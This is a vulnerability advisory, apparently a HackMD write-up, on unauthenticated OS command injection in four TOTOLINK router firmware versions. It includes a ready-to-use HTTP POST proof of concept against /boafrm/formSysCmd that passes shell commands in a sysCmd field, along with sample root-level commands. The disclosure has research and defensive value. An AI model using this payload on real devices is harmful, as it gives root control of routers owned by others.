# TOTOLINK using Boa API vulnerabilities

## Overview
Some TOTOLINK products using Boa API function are vulnerable to OS Command Injection.
## Products Affected
- TOTOLINK-CX-A3002RU-V1.0.4-B20171106.1512
- TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002
- TOTOLINK-CX-N300RT-V2.1.8-B20171113.1408
- TOTOLINK-CX-N302RE-V2.0.2-B20170511.1523

## Description
- A OS command injection vulnerability was found within the web interface of the device([CWE-78](https://cwe.mitre.org/data/definitions/78.html)).
## Impact
- An attacker may inject arbitrary shell commands without credentials, and it be executed by the device with root privileges.
## Solution
- If the products is not supported, please stop using the products and switch to alternative products.
## Mitigation 
- Disable internet access. 

## Explot PoC
- Uses external server`{Listen IP}:{Listen Port}` to see invisible code execution response

**Payload**
```http!
POST /boafrm/formSysCmd HTTP/1.1
Host: {Target IP}:{Target Port}
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 1
Content-Type: application/x-www-form-urlencoded

sysCmd={shell_cmd}
```

**Check product version**
- shell cmd: `cat /etc/version`
![image](https://hackmd.io/_uploads/H1jjAhKKR.png)

**Check gained root permission**
- shell cmd: `echo %USER`
![image](https://hackmd.io/_uploads/Syt0BhFFA.png)

## Affected products
**TOTOLINK-CX-A3002RU-V1.0.4-B20171106.1512**
![image](https://hackmd.io/_uploads/H1jjAhKKR.png)

**TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002**
![image](https://hackmd.io/_uploads/r1ZV1pYYA.png)

**TOTOLINK-CX-N300RT-V2.1.8-B20171113.1408**
![image](https://hackmd.io/_uploads/BJe4w1aYY0.png)

**TOTOLINK-CX-N302RE-V2.0.2-B20170511.1523**
![image](https://hackmd.io/_uploads/H1hqk6FtC.png)

## Reference
https://www.totolink.tw/products_view/N302RE
https://www.totolink.tw/products_view/N300RT
https://totolink.tw/support_view/A3002RU
https://totolink.tw/support_view/N150RT